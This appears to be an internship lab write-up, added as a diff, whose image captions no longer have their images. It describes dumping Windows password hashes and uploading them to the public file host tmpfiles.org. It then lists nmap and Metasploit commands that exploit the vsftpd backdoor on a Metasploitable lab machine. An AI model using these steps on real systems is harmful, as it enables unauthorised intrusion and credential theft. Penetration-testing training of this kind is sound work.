@@ -1,0 +1,78 @@
+
+
+Open the command prompt as administrator and enter the commands for creating the required hash file.
+
+
+ 
+The below image shows the hash.txt file created.
+
+
+Upload hash.txt to tmpfiles.org
+
+
+ 
+View the uploaded file through Kali Linux and copy the contents.
+
+
+ 
+
+
+nmap 10.0.2.5: This command will display a list on the terminal whose service is available, and you can choose the available port to perform the respective operations.
+
+
+
+
+nmap -p 21 — —script vuln 10.0.2.5: This command opens the port to ftp which includes the details of the vulnerability in the metasploitable machine which we will exploit.
+
+
+ 
+msfconsole: It is a framework. It allows testers to scan systems for vulnerabilities, conduct network reconnaissance, and launch exploits.
+search vsfptd: This command finds the vulnerabilities to exploit.
+use 0, show options: For these commands, the terminal will display a blank entry i.e. RHOSTS.
+set RHOSTS 10.0.2.5, show payloads, use 0: This command is used to set RHOSTS with the IP address of metasploitable. Finally, this command will display the IP address of metasploitable.
+ 
+ 
+
+
+
+ 
+
+exploit: This command will start the session.
+
+
+https://docs.google.com/document/d/1N7mDgnGJqL8rYJEIVdLe6o_3OGPWdCOn/edit?usp=share_link&ouid=106162006711453617716&rtpof=true&sd=true
+
+
+
+
+
+https://medium.com/@abhishekgshome/dlithe-internship-blog-f61b823694d3
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
